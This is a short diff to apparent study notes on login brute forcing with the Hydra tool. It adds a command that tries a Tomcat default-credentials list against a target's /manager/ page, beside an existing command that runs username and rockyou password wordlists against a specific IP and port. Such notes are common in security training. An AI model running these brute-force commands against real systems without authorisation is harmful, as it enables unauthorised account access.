@@ -29,3 +29,7 @@ Hydra is a handy tool for Login Brute Forcing, as it covers a wide variety of at
 Using different wordlists
 
 	hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
+
+Default Login popup on a webserver
+
+hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt <ip_target> -s 8080 http-get /manager/
